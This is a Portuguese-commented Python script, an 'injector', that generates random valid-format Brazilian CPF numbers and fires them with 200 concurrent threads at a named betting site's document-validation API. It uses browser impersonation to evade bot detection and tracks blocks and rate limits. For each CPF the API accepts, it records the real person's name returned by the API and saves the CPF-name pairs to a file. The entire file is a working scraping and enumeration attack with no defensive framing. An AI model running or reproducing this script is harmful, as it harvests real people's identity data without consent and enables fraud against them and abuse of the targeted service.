#!/usr/bin/env python3
"""
Injetor 200 Threads - Máxima velocidade
"""
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from curl_cffi import requests

# Configuração
THREADS = 200
RODADAS = 10  # 200 x 10 = 2000 requisições
TOTAL = THREADS * RODADAS

# Sessão compartilhada
SESSION = None
lock = threading.Lock()

# Contadores
stats = {"ok": 0, "validos": 0, "blocked": 0, "rate_limit": 0, "erro": 0}
cpfs_validos = []

def gerar_cpf():
    cpf = [random.randint(0, 9) for _ in range(9)]
    soma = sum((10 - i) * cpf[i] for i in range(9))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    soma = sum((11 - i) * cpf[i] for i in range(10))
    resto = soma % 11
    cpf.append(0 if resto < 2 else 11 - resto)
    return ''.join(map(str, cpf))

def worker(_):
    """Worker"""
    global SESSION
    cpf = gerar_cpf()
    
    try:
        r = SESSION.post(
            "https://7k.bet.br/api/documents/validate",
            json={"number": cpf, "type": "cpf"},
            headers={"Content-Type": "application/json", "Origin": "https://7k.bet.br"},
            timeout=30
        )
        
        status = r.status_code
        
        with lock:
            if status == 200:
                try:
                    nome = r.json().get("data", {}).get("name", "N/A")
                except:
                    nome = "N/A"
                cpfs_validos.append({"cpf": cpf, "nome": nome})
                stats["validos"] += 1
                stats["ok"] += 1
            elif status == 400:
                stats["ok"] += 1
            elif status == 403:
                stats["blocked"] += 1
            elif status == 429:
                stats["rate_limit"] += 1
            else:
                stats["erro"] += 1
        
        return status
        
    except:
        with lock:
            stats["erro"] += 1
        return -1

def main():
    global SESSION
    
    print("="*60)
    print(f"💉 INJETOR {THREADS} THREADS x {RODADAS} RODADAS = {TOTAL} REQ")
    print("="*60)
    
    SESSION = requests.Session(impersonate="chrome120")
    
    inicio = time.time()
    
    for rodada in range(1, RODADAS + 1):
        print(f"\n🚀 Rodada {rodada}/{RODADAS} - Disparando {THREADS} threads...")
        
        rodada_inicio = time.time()
        
        with ThreadPoolExecutor(max_workers=THREADS) as executor:
            futures = [executor.submit(worker, i) for i in range(THREADS)]
            for f in as_completed(futures):
                pass
        
        rodada_tempo = time.time() - rodada_inicio
        done = rodada * THREADS
        
        print(f"   ✅ OK: {stats['ok']} | 🎯 Válidos: {stats['validos']} | 🚫 403: {stats['blocked']} | ⏳ 429: {stats['rate_limit']} | Tempo: {rodada_tempo:.1f}s")
    
    tempo = time.time() - inicio
    
    print("\n" + "="*60)
    print("📊 RESULTADO FINAL")
    print("="*60)
    print(f"   Total: {TOTAL} requisições em {tempo:.1f}s")
    print(f"   Velocidade: {TOTAL/tempo:.1f} req/s")
    print(f"\n   ✅ OK: {stats['ok']}")
    print(f"   🎯 Válidos: {stats['validos']}")
    print(f"   🚫 Blocked: {stats['blocked']}")
    print(f"   ⏳ Rate Limit: {stats['rate_limit']}")
    print(f"   💥 Erros: {stats['erro']}")
    
    if cpfs_validos:
        print(f"\n🎯 {len(cpfs_validos)} CPFs VÁLIDOS:")
        with open("cpfs_200t.txt", "w", encoding="utf-8") as f:
            for v in cpfs_validos[:50]:  # Mostra só 50
                cpf = v["cpf"]
                linha = f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}"
                print(f"   {linha}")
                f.write(linha + "\n")
            if len(cpfs_validos) > 50:
                print(f"   ... e mais {len(cpfs_validos)-50}")
                for v in cpfs_validos[50:]:
                    cpf = v["cpf"]
                    f.write(f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]} | {v['nome']}\n")
        print(f"\n💾 Salvos em cpfs_200t.txt")

if __name__ == "__main__":
    main()







